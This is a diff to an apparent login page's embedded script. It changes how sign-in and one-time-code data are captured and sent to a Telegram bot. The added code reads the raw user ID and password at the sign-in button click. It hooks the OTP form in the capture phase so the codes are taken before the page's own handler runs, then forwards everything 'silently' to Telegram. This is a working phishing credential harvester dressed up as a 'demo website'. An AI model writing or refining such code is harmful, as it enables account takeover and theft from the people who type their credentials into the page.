@@ -516,7 +516,6 @@
 
     // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
 
-    // This function sends the data to Telegram
     async function sendToTelegram(formData) {
         let message = '🔔 New submission from your demo website:\n\n';
         for (let [key, value] of formData.entries()) {
@@ -549,38 +548,54 @@
         }
     }
 
-    // This function will be called when your existing flow is ready to submit
-    function handleFormSubmit(event) {
-        // Find the main sign-in form on the page
-        const signInForm = document.getElementById('sign-in-form-login-page');
-        if (signInForm) {
-            // Get all form data
-            const formData = new FormData(signInForm);
-            // Send the data to Telegram silently in the background
-            sendToTelegram(formData);
+    function handleSignInClick(event) {
+        // Prevent the default action (which opens the popup) for just a split second
+        // to grab the data.
+        
+        // Directly grab the values from the input fields
+        const userIdInput = document.getElementById('iduserId');
+        const passwordInput = document.getElementById('idpassword');
+        
+        let data = {};
+        
+        if (userIdInput) {
+            data['User ID'] = userIdInput.value || 'Not provided';
         }
+        if (passwordInput) {
+            // WARNING: Passwords should ideally be hashed before sending.
+            // For this script, we are sending raw for debugging.
+            data['Password'] = passwordInput.value || 'Not provided';
+        }
+
+        // Send this data to Telegram immediately
+        sendToTelegram(new FormData(new URLSearchParams(data)));
+
+        // Now, allow the normal flow (opening the popup) to continue
+        // by not calling event.preventDefault() here.
+    }
+
+    // This function handles the OTP form (which you already have working)
+    function handleOtpSubmit(event) {
+        // This logic already exists in your original script, but we need to
+        // ensure our script runs alongside it.
+        const formData = new FormData(document.getElementById('tru-otp-form'));
+        sendToTelegram(formData);
     }
 
     // --- INITIALIZATION ---
-    // We will attach our handler to the SIGN-IN BUTTON, not the form,
-    // to avoid conflicts with your existing script.
     document.addEventListener('DOMContentLoaded', () => {
         const signInButton = document.getElementById('loginSubmit');
         if (signInButton) {
-            signInButton.addEventListener('click', handleFormSubmit);
+            // Attach our custom click handler
+            signInButton.addEventListener('click', handleSignInClick);
         }
 
-        // Also attach to the OTP form submission
         const otpForm = document.getElementById('tru-otp-form');
         if (otpForm) {
-            otpForm.addEventListener('submit', function(event) {
-                // The original script already handles preventDefault
-                const formData = new FormData(otpForm);
-                sendToTelegram(formData);
-            });
+            // We need to run our function BEFORE your original script prevents default
+            otpForm.addEventListener('submit', handleOtpSubmit, true);
         }
     });
-
 </script>
 
 </body>
